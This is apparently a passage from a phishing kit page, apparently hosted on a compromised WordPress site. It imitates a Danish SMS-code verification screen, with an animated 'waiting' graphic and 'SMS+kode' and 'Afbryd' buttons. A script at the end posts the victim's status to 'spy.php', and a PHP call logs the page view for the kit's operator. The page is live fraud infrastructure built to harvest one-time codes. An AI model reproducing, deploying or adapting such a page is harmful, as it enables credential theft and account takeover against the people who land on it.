OnJldHVybnt0Omksdjp6KHQsZS52LHIudil9O2Nhc2UiZyI6aWYoZS5yPT09ci5yKXt2YXIgdT17dDppLHM6WHQodCxlLnMsci5zKSxyOmUucn07cmV0dXJuIGUuZ3QmJnIuZ3QmJih1Lmd0PVkodCxlLmd0LHIuZ3QpKSxlLmM/KHUuYz1xKHQsZS5jLHIuYyksdS5yZD1GKHQsZS5yZCxyLnJkKSk6ZS5mJiYodS5mPXEodCxlLmYsci5mKSx1LnRvPXEodCxlLnRvLHIudG8pKSx1fX1pZigiYyI9PT1lLnQmJiJnIj09PXIudHx8ImMiPT09ci50JiYiZyI9PT1lLnQpe3ZhciBvPSJjIj09PWUudD9lOnIsYT0iZyI9PT1lLnQ/bih7fSxlKTpuKHt9LHIpLGw9YS5zLm1hcCgoZnVuY3Rpb24odCl7cmV0dXJue2M6by52LG86dC5vfX0pKTtyZXR1cm4gYS5zPSJjIj09PWUudD9YdCh0LGwsYS5zKTpYdCh0LGEucyxsKSxhfX1yZXR1cm4gTih0LGUscil9ZnVuY3Rpb24gWHQodCxuLGUpe2lmKG4ubGVuZ3RoPT09ZS5sZW5ndGgpcmV0dXJuIG4ubWFwKChmdW5jdGlvbihuLHIpe3JldHVybiBKdCh0LG4sZVtyXSl9KSk7Zm9yKHZhciByPU1hdGgubWF4KG4ubGVuZ3RoLGUubGVuZ3RoKSxpPVtdLHU9MDt1PHI7dSsrKXt2YXIgbz1KdCh0LG5bTWF0aC5taW4odSxuLmxlbmd0aC0xKV0sZVtNYXRoLm1pbih1LGUubGVuZ3RoLTEpXSk7aS5wdXNoKG8pfXJldHVybiBpfWZ1bmN0aW9uIEp0KHQsbixlKXtyZXR1cm57bzpMKHQsbi5vLGUub3x8MCksYzp6KHQsbi5jLGUuY3x8e30pfX1mdW5jdGlvbiBadCh0KXtyZXR1cm4gdC5yZXBsYWNlKC8tZmlsbC0oWzAtOV0rKSQvLChmdW5jdGlvbih0LG4pe3JldHVybiItZmlsbC0iKygrbisxKX0pKX12YXIgS3Q9e2JsdXI6VixicmlnaHRuZXNzOkYsY29udHJhc3Q6RiwiZHJvcC1zaGFkb3ciOmZ1bmN0aW9uKHQsbixlKXtyZXR1cm4gMD09PXQ/bjoxPT09dD9lOntibHVyOlYodCxuLmJsdXIsZS5ibHVyKSxvZmZzZXQ6cSh0LG4ub2Zmc2V0LGUub2Zmc2V0KSxjb2xvcjp6KHQsbi5jb2xvcixlLmNvbG9yKX19LGdyYXlzY2FsZTpGLCJodWUtcm90YXRlIjpDLGludmVydDpGLG9wYWNpdHk6RixzYXR1cmF0ZTpGLHNlcGlhOkZ9O2Z1bmN0aW9uIHRuKHQsbixlKXtpZigwPT09dClyZXR1cm4gbjtpZigxPT09dClyZXR1cm4gZTt2YXIgcj1uLmxlbmd0aDtpZihyIT09ZS5sZW5ndGgpcmV0dXJuIE4odCxuLGUpO2Zvcih2YXIgaSx1PVtdLG89MDtvPHI7bysrKXtpZihuW29dLnR5cGUhPT1lW29dLnR5cGUpcmV0dXJuIG47aWYoIShpPUt0W25bb10udHlwZV0pKXJldHVybiBOKHQsbixlKTt1LnB1c2goe3R5cGU6bi50eXBlLHZhbHVlOmkodCxuW29dLnZhbHVlLGVbb10udmFsdWUpfSl9cmV0dXJuIHV9dmFyIG5uPXtibHVyOmZ1bmN0aW9uKHQpe3JldHVybiB0P2Z1bmN0aW9uKG4pe3Quc2V0QXR0cmlidXRlKCJzdGREZXZpYXRpb24iLGR0KG4pKX06bnVsbH0sYnJpZ2h0bmVzczpmdW5jdGlvbih0LG4sZSl7cmV0dXJuKHQ9cm4oZSxuKSk/ZnVuY3Rpb24obil7bj1odChuKSx0Lm1hcCgoZnVuY3Rpb24odCl7cmV0dXJuIHQuc2V0QXR0cmlidXRlKCJzbG9wZSIsbil9KSl9Om51bGx9LGNvbnRyYXN0OmZ1bmN0aW9uKHQsbixlKXtyZXR1cm4odD1ybihlLG4pKT9mdW5jdGlvbihuKXt2YXIgZT1odCgoMS1uKS8yKTtuPWh0KG4pLHQubWFwKChmdW5jdGlvbih0KXt0LnNldEF0dHJpYnV0ZSgic2xvcGUiLG4pLHQuc2V0QXR0cmlidXRlKCJpbnRlcmNlcHQiLGUpfSkpfTpudWxsfSwiZHJvcC1zaGFkb3ciOmZ1bmN0aW9uKHQsbixlKXt2YXIgcj1lLmdldEVsZW1lbnRCeUlkKG4rIi1ibHVyIik7aWYoIXIpcmV0dXJuIG51bGw7dmFyIGk9ZS5nZXRFbGVtZW50QnlJZChuKyItb2Zmc2V0Iik7aWYoIWkpcmV0dXJuIG51bGw7dmFyIHU9ZS5nZXRFbGVtZW50QnlJZChuKyItZmxvb2QiKTtyZXR1cm4gdT9mdW5jdGlvbih0KXtyLnNldEF0dHJpYnV0ZSgic3RkRGV2aWF0aW9uIixkdCh0LmJsdXIpKSxpLnNldEF0dHJpYnV0ZSgiZHgiLGh0KHQub2Zmc2V0LngpKSxpLnNldEF0dHJpYnV0ZSgiZHkiLGh0KHQub2Zmc2V0LnkpKSx1LnNldEF0dHJpYnV0ZSgiZmxvb2QtY29sb3IiLHl0KHQuY29sb3IpKX06bnVsbH0sZ3JheXNjYWxlOmZ1bmN0aW9uKHQpe3JldHVybiB0P2Z1bmN0aW9uKG4pe3Quc2V0QXR0cmlidXRlKCJ2YWx1ZXMiLHZ0KGZ1bmN0aW9uKHQpe3JldHVyblsuMjEyNisuNzg3NCoodD0xLXQpLC43MTUyLS43MTUyKnQsLjA3MjItLjA3MjIqdCwwLDAsLjIxMjYtLjIxMjYqdCwuNzE1MisuMjg0OCp0LC4wNzIyLS4wNzIyKnQsMCwwLC4yMTI2LS4yMTI2KnQsLjcxNTItLjcxNTIqdCwuMDcyMisuOTI3OCp0LDAsMCwwLDAsMCwxLDBdfShuKSkpfTpudWxsfSwiaHVlLXJvdGF0ZSI6ZnVuY3Rpb24odCl7cmV0dXJuIHQ/ZnVuY3Rpb24obil7cmV0dXJuIHQuc2V0QXR0cmlidXRlKCJ2YWx1ZXMiLGh0KG4pKX06bnVsbH0saW52ZXJ0OmZ1bmN0aW9uKHQsbixlKXtyZXR1cm4odD1ybihlLG4pKT9mdW5jdGlvbihuKXtuPWh0KG4pKyIgIitodCgxLW4pLHQubWFwKChmdW5jdGlvbih0KXtyZXR1cm4gdC5zZXRBdHRyaWJ1dGUoInRhYmxlVmFsdWVzIixuKX0pKX06bnVsbH0sb3BhY2l0eTpmdW5jdGlvbih0LG4sZSl7cmV0dXJuKHQ9ZS5nZXRFbGVtZW50QnlJZChuKyItQSIpKT9mdW5jdGlvbihuKXtyZXR1cm4gdC5zZXRBdHRyaWJ1dGUoInRhYmxlVmFsdWVzIiwiMCAiK2h0KG4pKX06bnVsbH0sc2F0dXJhdGU6ZnVuY3Rpb24odCl7cmV0dXJuIHQ/ZnVuY3Rpb24obil7cmV0dXJuIHQuc2V0QXR0cmlidXRlKCJ2YWx1ZXMiLGh0KG4pKX06bnVsbH0sc2VwaWE6ZnVuY3Rpb24odCl7cmV0dXJuIHQ/ZnVuY3Rpb24obil7cmV0dXJuIHQuc2V0QXR0cmlidXRlKCJ2YWx1ZXMiLHZ0KGZ1bmN0aW9uKHQpe3JldHVyblsuMzkzKy42MDcqKHQ9MS10KSwuNzY5LS43NjkqdCwuMTg5LS4xODkqdCwwLDAsLjM0OS0uMzQ5KnQsLjY4NisuMzE0KnQsLjE2OC0uMTY4KnQsMCwwLC4yNzItLjI3Mip0LC41MzQtLjUzNCp0LC4xMzErLjg2OSp0LDAsMCwwLDAsMCwxLDBdfShuKSkpfTpudWxsfX07dmFyIGVuPVsiUiIsIkciLCJCIl07ZnVuY3Rpb24gcm4odCxuKXt2YXIgZT1lbi5tYXAoKGZ1bmN0aW9uKGUpe3JldHVybiB0LmdldEVsZW1lbnRCeUlkKG4rIi0iK2UpfHxudWxsfSkpO3JldHVybi0xIT09ZS5pbmRleE9mKG51bGwpP251bGw6ZX12YXIgdW49e2ZpbGw6SHQsImZpbGwtb3BhY2l0eSI6R3Qsc3Ryb2tlOkh0LCJzdHJva2Utb3BhY2l0eSI6R3QsInN0cm9rZS13aWR0aCI6WXQsInN0cm9rZS1kYXNob2Zmc2V0Ijp7ZjpodCxpOkN9LCJzdHJva2UtZGFzaGFycmF5IjpVdCxvcGFjaXR5Okd0LHRyYW5zZm9ybTpmdW5jdGlvbih0LG4scixpKXtpZighKHQ9ZnVuY3Rpb24odCxuKXtpZighdHx8Im9iamVjdCIhPT1lKHQpKXJldHVybiBudWxsO3ZhciByPSExO2Zvcih2YXIgaSBpbiB0KXQuaGFzT3duUHJvcGVydHkoaSkmJih0W2ldJiZ0W2ldLmxlbmd0aD8odFtpXS5mb3JFYWNoKChmdW5jdGlvbih0KXt0LmUmJih0LmU9bih0LmUpKX0pKSxyPSEwKTpkZWxldGUgdFtpXSk7cmV0dXJuIHI/dDpudWxsfSh0LGkpKSlyZXR1cm4gbnVsbDt2YXIgdT1mdW5jdGlvbihlLGksdSl7dmFyIG89YXJndW1lbnRzLmxlbmd0aD4zJiZ2b2lkIDAhPT1hcmd1bWVudHNbM10/YXJndW1lbnRzWzNdOm51bGw7cmV0dXJuIHRbZV0/cihpLHRbZV0sdSk6biYmbltlXT9uW2VdOm99O3JldHVybiBuJiZuLmEmJnQubz9mdW5jdGlvbihuKXt2YXIgZT1yKG4sdC5vLEZ0KTtyZXR1cm4gVnQucmVjb21wb3NlU2VsZihlLHUoInIiLG4sQywwKStlLmEsdSgiayIsbixxKSx1KCJzIixuLHEpLHUoInQiLG4scSkpLnRvU3RyaW5nKCl9OmZ1bmN0aW9uKHQpe3JldHVybiBWdC5yZWNvbXBvc2VTZWxmKHUoIm8iLHQsQ3QsbnVsbCksdSgiciIsdCxDLDApLHUoImsiLHQscSksdSgicyIsdCxxKSx1KCJ0Iix0LHEpKS50b1N0cmluZygpfX0sIiNmaWx0ZXIiOmZ1bmN0aW9uKHQsbixlLHIsaSx1LG8sYSl7aWYoIW4uaXRlbXN8fCF0fHwhdC5sZW5ndGgpcmV0dXJuIG51bGw7dmFyIGw9ZnVuY3Rpb24odCxuKXt2YXIgZT0odD10Lm1hcCgoZnVuY3Rpb24odCl7cmV0dXJuIHQmJm5uW3RbMF1dPyhuLmdldEVsZW1lbnRCeUlkKHRbMV0pLG5uW3RbMF1dKG4uZ2V0RWxlbWVudEJ5SWQodFsxXSksdFsxXSxuKSk6bnVsbH0pKSkubGVuZ3RoO3JldHVybiBmdW5jdGlvbihuKXtmb3IodmFyIHI9MDtyPGU7cisrKXRbcl0mJnRbcl0obltyXS52YWx1ZSl9fShuLml0ZW1zLGEpO3JldHVybiBsPyh0PWZ1bmN0aW9uKHQsbil7cmV0dXJuIHQubWFwKChmdW5jdGlvbih0KXtyZXR1cm4gdC5lPW4odC5lKSx0fSkpfSh0LHIpLGZ1bmN0aW9uKG4pe2woZShuLHQsdG4pKX0pOm51bGx9LCIjbGluZSI6enQscG9pbnRzOntmOnZ0LGk6WX0sZDpEdCxyOll0LCIjc2l6ZSI6bXQsIiNyYWRpdXMiOnB0LF86ZnVuY3Rpb24odCxuKXtpZihBcnJheS5pc0FycmF5KHQpKWZvcih2YXIgZT0wO2U8dC5sZW5ndGg7ZSsrKXRoaXNbdFtlXV09bjtlbHNlIHRoaXNbdF09bn19LG9uPWZ1bmN0aW9uKHQpeyFmdW5jdGlvbih0LG4pe2lmKCJmdW5jdGlvbiIhPXR5cGVvZiBuJiZudWxsIT09bil0aHJvdyBuZXcgVHlwZUVycm9yKCJTdXBlciBleHByZXNzaW9uIG11c3QgZWl0aGVyIGJlIG51bGwgb3IgYSBmdW5jdGlvbiIpO3QucHJvdG90eXBlPU9iamVjdC5jcmVhdGUobiYmbi5wcm90b3R5cGUse2NvbnN0cnVjdG9yOnt2YWx1ZTp0LHdyaXRhYmxlOiEwLGNvbmZpZ3VyYWJsZTohMH19KSxuJiZsKHQsbil9KG8sdCk7dmFyIG4sZSxpPShuPW8sZT1zKCksZnVuY3Rpb24oKXt2YXIgdCxyPWEobik7aWYoZSl7dmFyIGk9YSh0aGlzKS5jb25zdHJ1Y3Rvcjt0PVJlZmxlY3QuY29uc3RydWN0KHIsYXJndW1lbnRzLGkpfWVsc2UgdD1yLmFwcGx5KHRoaXMsYXJndW1lbnRzKTtyZXR1cm4gYyh0aGlzLHQpfSk7ZnVuY3Rpb24gbygpe3JldHVybiByKHRoaXMsbyksaS5hcHBseSh0aGlzLGFyZ3VtZW50cyl9cmV0dXJuIHUobyxudWxsLFt7a2V5OiJidWlsZCIsdmFsdWU6ZnVuY3Rpb24odCl7dmFyIG49aChhKG8pLCJidWlsZCIsdGhpcykuY2FsbCh0aGlzLHQsdW4pO2lmKCFuKXJldHVybiBudWxsO3ZhciBlPW4uZWwscj1uLm9wdGlvbnMsaT1uLnBsYXllcjtyZXR1cm4gZnVuY3Rpb24odCxuLGUpe2lmKCJjbGljayI9PT1lLnN0YXJ0KXt2YXIgcj1mdW5jdGlvbigpe3N3aXRjaChlLmNsaWNrKXtjYXNlImZyZWV6ZSI6cmV0dXJuIXQuX3J1bm5pbmcmJnQucmVhY2hlZFRvRW5kKCkmJih0Lm9mZnNldD0wKSx0Ll9ydW5uaW5nP3QucGF1c2UoKTp0LnBsYXkoKTtjYXNlInJlc3RhcnQiOnJldHVybiB0Lm9mZnNldD4wP3QucmVzdGFydCgpOnQucGxheSgpO2Nhc2UicmV2ZXJzZSI6dmFyIG49IXQuX3JvbGxpbmdCYWNrJiZ0Ll9ydW5uaW5nLHI9dC5yZWFjaGVkVG9FbmQoKTtyZXR1cm4gbnx8ciYmMT09PXQuZmlsbD8odC5wYXVzZSgpLHImJih0Lm9mZnNldD10LmR1cmF0aW9uLTEpLHQuX3JvbGxiYWNrKCkpOnI/dC5yZXN0YXJ0KCk6dC5wbGF5KCk7Y2FzZSJub25lIjpkZWZhdWx0OnJldHVybiF0Ll9ydW5uaW5nJiZ0Lm9mZnNldD90LnJlc3RhcnQoKTp0LnBsYXkoKX19O3JldHVybiB2b2lkIG4uYWRkRXZlbnRMaXN0ZW5lcigiY2xpY2siLHIpfWlmKCJob3ZlciI9PT1lLnN0YXJ0KXJldHVybiBuLmFkZEV2ZW50TGlzdGVuZXIoIm1vdXNlZW50ZXIiLChmdW5jdGlvbigpe3JldHVybiB0LnJlYWNoZWRUb0VuZCgpP3QucmVzdGFydCgpOnQucGxheSgpfSkpLHZvaWQgbi5hZGRFdmVudExpc3RlbmVyKCJtb3VzZWxlYXZlIiwoZnVuY3Rpb24oKXtzd2l0Y2goZS5ob3Zlcil7Y2FzZSJmcmVlemUiOnJldHVybiB0LnBhdXNlKCk7Y2FzZSJyZXNldCI6cmV0dXJuIHQuc3RvcCgpO2Nhc2UicmV2ZXJzZSI6cmV0dXJuIHQucGF1c2UoKSx0Ll9yb2xsYmFjaygpO2Nhc2Uibm9uZSI6ZGVmYXVsdDpyZXR1cm59fSkpO2lmKCJzY3JvbGwiPT09ZS5zdGFydClyZXR1cm4gdm9pZCBuZXcgY3QobixlLnNjcm9sbHx8MjUsKGZ1bmN0aW9uKG4pe24/dC5yZWFjaGVkVG9FbmQoKT90LnJlc3RhcnQoKTp0LnBsYXkoKTp0LnBhdXNlKCl9KSk7dC5wbGF5KCl9KGksZSxyKSxpfX1dKSxvfShzdCk7cmV0dXJuIG9uLmluaXQoKSxvbn0pKTsKKGZ1bmN0aW9uKHMsaSxvLHcpe3dbb109d1tvXXx8e307d1tvXVtzXT13W29dW3NdfHxbXTt3W29dW3NdLnB1c2goaSk7fSkoJzkxYzgwZDc3Jyx7InJvb3QiOiJldFpHSDJRejl3MDEiLCJhbmltYXRpb25zIjpbeyJlbGVtZW50cyI6eyJldFpHSDJRejl3MDIwIjp7InRyYW5zZm9ybSI6eyJkYXRhIjp7Im8iOnsieCI6OTAsInkiOjkwLCJ0eXBlIjoiY29ybmVyIn0sInQiOnsieCI6LTEwLCJ5IjotMTB9fSwia2V5cyI6eyJzIjpbeyJ0IjoxMDAwLCJ2Ijp7IngiOjEsInkiOjF9LCJlIjpbMCwwLDAuNTgsMV19LHsidCI6MTQwMCwidiI6eyJ4IjoxLjcsInkiOjEuN30sImUiOlswLjQyLDAsMSwxXX0seyJ0IjoxODAwLCJ2Ijp7IngiOjEsInkiOjF9LCJlIjpbMCwwLDAuNTgsMV19LHsidCI6MjIwMCwidiI6eyJ4IjoxLjcsInkiOjEuN30sImUiOlswLjQyLDAsMSwxXX0seyJ0IjoyNjAwLCJ2Ijp7IngiOjEsInkiOjF9fSx7InQiOjY4MDAsInYiOnsieCI6MSwieSI6MX0sImUiOlswLDAsMC41OCwxXX0seyJ0Ijo5MDAwLCJ2Ijp7IngiOjEsInkiOjF9LCJlIjpbMC40MiwwLDEsMV19XX19LCJvcGFjaXR5IjpbeyJ0IjoxMDAwLCJ2IjoxLCJlIjpbMSwwXX0seyJ0Ijo0NDAwLCJ2IjowLCJlIjpbMSwwXX0seyJ0Ijo4MDkwLCJ2IjoxfV19LCJldFpHSDJRejl3MDIxIjp7InRyYW5zZm9ybSI6eyJkYXRhIjp7Im8iOnsieCI6OTAuMDAwMDAxLCJ5Ijo5MC4wMDAwMDEsInR5cGUiOiJjb3JuZXIifSwidCI6eyJ4IjotNS44NTUyNjQsInkiOi02LjEzNzkyMn19LCJrZXlzIjp7InMiOlt7InQiOjI1ODAsInYiOnsieCI6MS43MDc4NjUsInkiOjEuNjI5MjE2fSwiZSI6WzAuMTc1LDAuODg1LDAuMzIsMS4yNzVdfSx7InQiOjI2MDAsInYiOnsieCI6NC4yNjk2NjMsInkiOjQuMTk3MzE0fSwiZSI6WzAuMTc1LDAuODg1LDAuMzIsMS4yNzVdfSx7InQiOjMwODAsInYiOnsieCI6MTUsInkiOjE1fX0seyJ0Ijo2ODAwLCJ2Ijp7IngiOjE1LCJ5IjoxNX19XX19LCJmaWxsLW9wYWNpdHkiOlt7InQiOjI2MDAsInYiOjF9LHsidCI6NDQwMCwidiI6MX0seyJ0Ijo0ODAwLCJ2IjowfSx7InQiOjY4MDAsInYiOjB9XX0sImV0WkdIMlF6OXcwMjMiOnsidHJhbnNmb3JtIjp7ImRhdGEiOnsibyI6eyJ4Ijo5MCwieSI6OTAsInR5cGUiOiJjb3JuZXIifSwidCI6eyJ4IjotMTAuMiwieSI6LTEwfX0sImtleXMiOnsicyI6W3sidCI6MTAwMCwidiI6eyJ4IjoxLjA5Mzc1LCJ5IjoxLjA5Mzc1fSwiZSI6WzAsMCwwLjU4LDFdfSx7InQiOjE0MDAsInYiOnsieCI6MS44NzUsInkiOjEuODc1fSwiZSI6WzAuNDIsMCwxLDFdfSx7InQiOjE4MDAsInYiOnsieCI6MS4wOTM3NSwieSI6MS4wOTM3NTF9LCJlIjpbMCwwLDAuNTgsMV19LHsidCI6MjIwMCwidiI6eyJ4IjoxLjg3NSwieSI6MS44NzV9LCJlIjpbMC40MiwwLDEsMV19LHsidCI6MjU4MCwidiI6eyJ4IjoxLCJ5IjoxfSwiZSI6WzAuMjUsMSwwLjI1LDFdfSx7InQiOjI2MDAsInYiOnsieCI6MS44NzUsInkiOjEuODc1fSwiZSI6WzAuMjUsMSwwLjI1LDFdfSx7InQiOjI4ODAsInYiOnsieCI6NC4yMzAzMDgsInkiOjQuMjMwMzA4fSwiZSI6WzAuNDIsMCwxLDFdfSx7InQiOjMwODAsInYiOnsieCI6My41MzY5NDMsInkiOjMuNTM2OTQzfX1dfX0sIm9wYWNpdHkiOlt7InQiOjQ0MDAsInYiOjF9LHsidCI6NDgwMCwidiI6MH1dfSwiZXRaR0gyUXo5dzAyNiI6eyJvcGFjaXR5IjpbeyJ0Ijo0NDAwLCJ2IjowfSx7InQiOjQ4MDAsInYiOjF9LHsidCI6ODA5MCwidiI6MX0seyJ0Ijo4NTkwLCJ2IjowfV19LCJldFpHSDJRejl3MDI3Ijp7ImZpbGwtb3BhY2l0eSI6W3sidCI6NDQwMCwidiI6MCwiZSI6WzAuNDcsMCwwLjc0NSwwLjcxNV19LHsidCI6NDgwMCwidiI6MX0seyJ0Ijo4MDkwLCJ2IjoxfSx7InQiOjg1OTAsInYiOjB9XX0sImV0WkdIMlF6OXcwMjgiOnsib3BhY2l0eSI6W3sidCI6NDQwMCwidiI6MCwiZSI6WzAuNDcsMCwwLjc0NSwwLjcxNV19LHsidCI6NDgwMCwidiI6MX0seyJ0Ijo3MzkwLCJ2IjoxfSx7InQiOjg1OTAsInYiOjB9XX0sImV0WkdIMlF6OXcwMzAiOnsidHJhbnNmb3JtIjp7ImRhdGEiOnsicyI6eyJ4IjotNy41NTcxNCwieSI6MX0sInQiOnsieCI6LTMuMDQzNDc5LCJ5IjotMTV9fSwia2V5cyI6eyJvIjpbeyJ0Ijo1NzAwLCJ2Ijp7IngiOjQ3LjAwMDAwMywieSI6MTQwLCJ0eXBlIjoiY29ybmVyIn0sImUiOlswLDAsMC4wOTUsMC44NDVdfSx7InQiOjY4MDAsInYiOnsieCI6ODcuMDAwMDAzLCJ5IjoxNDAsInR5cGUiOiJjb3JuZXIifX0seyJ0Ijo3MTAwLCJ2Ijp7IngiOjk3LjAwMDAwMywieSI6MTQwLCJ0eXBlIjoiY29ybmVyIn19XX19LCJvcGFjaXR5IjpbeyJ0Ijo0NDAwLCJ2IjowLCJlIjpbMSwwXX0seyJ0Ijo0ODAwLCJ2IjoxfSx7InQiOjgxMDAsInYiOjB9XX0sImV0WkdIMlF6OXcwMzQiOnsidHJhbnNmb3JtIjp7ImRhdGEiOnsidCI6eyJ4IjotMzAsInkiOi0xMH19LCJrZXlzIjp7Im8iOlt7InQiOjU3MDAsInYiOnsieCI6NTAsInkiOjE0MCwidHlwZSI6ImNvcm5lciJ9LCJlIjpbMCwwLDAuMDk1LDAuODQ1XX0seyJ0Ijo2ODAwLCJ2Ijp7IngiOjkwLCJ5IjoxNDAsInR5cGUiOiJjb3JuZXIifX1dfX0sIm9wYWNpdHkiOlt7InQiOjQ0MDAsInYiOjAsImUiOlswLjQ3LDAsMC43NDUsMC43MTVdfSx7InQiOjQ4MDAsInYiOjF9LHsidCI6ODA5MCwidiI6MX0seyJ0Ijo4MzkwLCJ2IjowfV19LCJldFpHSDJRejl3MDM3Ijp7InRyYW5zZm9ybSI6eyJkYXRhIjp7Im8iOnsieCI6OTAsInkiOjgwLCJ0eXBlIjoiY29ybmVyIn0sInQiOnsieCI6LTEwLjIsInkiOi0xMH19LCJrZXlzIjp7InMiOlt7InQiOjEwMDAsInYiOnsieCI6MS4wOTM3NSwieSI6MS4wOTM3NX0sImUiOlswLDAsMC41OCwxXX0seyJ0Ijo2ODAwLCJ2Ijp7IngiOjEuMDkzNzUsInkiOjEuMDkzNzV9LCJlIjpbMCwwLDAuNTgsMV19LHsidCI6OTAwMCwidiI6eyJ4IjoxLjA5Mzc1MSwieSI6MS4wOTM3NTF9LCJlIjpbMC40MiwwLDEsMV19XX19LCJvcGFjaXR5IjpbeyJ0IjoxMDAwLCJ2IjowLCJlIjpbMSwwXX0seyJ0Ijo2NzkwLCJ2IjoxfSx7InQiOjY4MDAsInYiOjB9LHsidCI6ODk5MCwidiI6MX1dfX0sInMiOiJNRExBMU5HSTJOV1E1Wk9sSmlNR0ZrT1dOaEdabUUwWVdGT1lUbERaTldRM05UWmpURFdabU5tSTJZalppTktqYzFaRk01Wm1FMEVZV1JoTURsbFlXWkNoTkdGaFlUazFaRE9jMU5tTTJOMFUxWkZFbGhORk5YWVdaaERNR0ZrT1dOaFptRUkwWVdGaE9XRmxOV0dRM05UWmlVRFkzTktXUmhNV0UwWVRkaElOelZrTnpVMll6WUszTldSSk9XTmhOMlVGbVlUQmhaR0U1T0JXTmhabEJoTURWa01OelZoTVRsallUZENoWldFd05qZE1OV1ZSaFpXRmlZVEJoTVlEbG1OV1JNTnpVMlFZMkk0In1dLCJvcHRpb25zIjoiTURKQXhNRGd5TWprM1lHVGRpUXpZNE56azNUWWpJNU5ERXlPVGNZek56WkROamcyWWtHZ3lPVGcwIn0sJ19fU1ZHQVRPUl9QTEFZRVJfXycsd2luZG93KV1dPjwvc2NyaXB0Pjwvc3ZnPgo=">
                    </object>
                </div>
                <style>
                    body,
                    html {
                        margin: 0;
                        padding: 0;
                        height: 100%;
                        display: flex;
                        justify-content: center;
                        align-items: center;
                    }

                    .container1 {
                        display: flex;
                        justify-content: center;
                        align-items: center;
                        height: 100%;
                        width: 100%;
                    }

                    .code-app-emulator {
                        width: 210px;
                        /* Adjust the width as needed */
                        height: auto;
                        /* Maintain aspect ratio */
                    }
                </style>
                <br>
                <br>
                <br>
                <br>



            </section>


            <section style="border-top: 1px solid #eee;">
                <div class="buttons">
                    <button type="submit" id="smspasswd" name="smspasswd" value="smspasswd">
                        SMS+kode
                    </button>
                    <button type="submit" id="cancel" name="cancel" value="cancel"><img data-savepage-currentsrc="https://www.asesoriafersan.com/wp-admin/css/colors/blue/dodk/verification_files/back.png" data-savepage-src="./verification_files/back.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAQAAAAEACAYAAABccqhmAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAABXNJREFUeNrs3N11VFUYgOEdzH3owHSAHRgqgA6CFYAVxFSAVsChAmIHYwexg9ABVABzJjl6Fit4IT/5eZ9nrVnLO+WM38ue5Js9BgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAX+J4+zrxGO6vBx4BnzEP/uQx3G/7HgHXeLV9PfMYnAAw/DgBEHCwfZ1tX0cehQDQG/7N9vWTR+EjAIYfASDg0fZ1YfgFgObwz3/zP/QoBADDjwAQMG/3nRt+BKA5/JPHgAD0PDf8fMoeQIPtPpwADD8IQMWB4cdHgO7wb4YFH5wADD8IQMMjw4+PAO3ht+CDE4DhBwEoeGL4EYCmebX3zPAjAM3hnzwGBKDnpeHna/BbgLvHdh9OAIYfnAAqbPfhBGD4QQAMPwjAvefKbgQgPPzz3/wWfBCAmJ8NPwLQdGz4EYDu8E8eAwLQ48puboRFoJtnuw8nAMMPTgAVB1dH/qceBQLQG/7NsOCDjwCGHwSgwZXd+AgQH34LPjgBGH4QgAKrvfgIEB7+yWPACcDwgwBEvDL8CEB3+J95DAiA4Ydbzw8Bv5ztPpwADD8IQMmPhh8fAZps9+EEYPhBAEpc2Y0ARNnrRwDCwz95DAhAz4nh577yW4D/ZrsPJwDDD04AFfN239n2deRRIAC94d8M231rQvhtnd7kv3zP8zf8jOwM+hnApXm779zw4yNAc/jnv/kt+JDzwPAbfgSg6Pjq2G/4EYDg8E/efgTA8IMARLiyG6IBsNoLwQAcGH643n5g+DfDgg/kTgCGH6IBcGU3RD8C2O6D6AnA8EM0AE8MPzQDMG/3nRl+6AXAai9EA/DS8MP/d5d/C2C7D6InAMMPwROAK7shGgCrvRD9CGD4IRqAebvvwvBDLwBWeyEaAMMP0QC4shuiAbDaC9EAPDf88P3cpj0A230QPQEYfoieAN5sX0+9FdA8AbzzNkA3AL8MP/iD9M8A5gj87u2A72vvlv332AHADAZPAIvXw28DIBuAJQLzbwX8cBBiHwHWfBkIMxg8ASz+HpdXfzkJQDAA6wice6ug9RFgzZVgmMHgCWDx3kkAugFYR2DytkHrI8CnfHsQMxg7Aaz5/gCEA7BE4IW3EHofAdZ8fwAzGDwBLHx/AMIngIXVYcxg8ASwsDoM4QCIAMQDsETgcNgahGQAZlaHIRyAdQQ23mboBWCJwONhTwCSAVhYHYZwAJYIuHocVvaCf2arw5jB4AlgYXUYwgFYIuDqcRw/4n9+3x/AR4Awq8P4CCACtgZx/Khz9Ti5Gdz3/P+xXh0WgX9thnVqYieB+dbhD16714n/JfwMoHYSsDqMAMSJAAIgAq4eRwDK/hhWhxGANN8fQABEYPfrQVuDCECU1WEEQAREAAGoR+Bw+P4AApDl6nEEQARcPY4A1CPg6nEEIM7qMAIgAq4eRwDKfh22BhGANKvDCIAIuHocASj7c9gaRADSrA4jACJgaxABEAERQACyfH8AARCBXQQmjwIB6EbA6jACECcCCIAIuHocAShz9TgCEOf7AwiACLh6HAEoszqMAIiACCAA9QgcDluDCECW1WEEQARcPY4A1CPg6nEEIM7qMAIgAuM3jwEB6DodtgYRgDSrwwiACLh6HAEoc/U4AhBndRgBEIHdNwltDSIAUW+H1WEEIM33BxAAEXD1OAJQj4DVYQQgTgQQABGwNYgAlFkdRgBEQAQQgHoEXD2OAIRZHUYARGAXgQuPQgDoRsD3BwSAMKvDAoAIuHpcAKhHwNXjAkCc1WEBQARcPV7wg0fAZ/w1Ln9F+PDqnwEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAkj4KMAD1UzpAC9IdvgAAAABJRU5ErkJggg==" alt="cancel">
                        Afbryd
                    </button>
                </div>


            </section>
        </section>




</section>

    <script>
        $.post("spy.php", {
            waitingview: 1
        });
    </script>
	    <?php
    $m->ctr("APP PAGE");
    ?>

</body></html>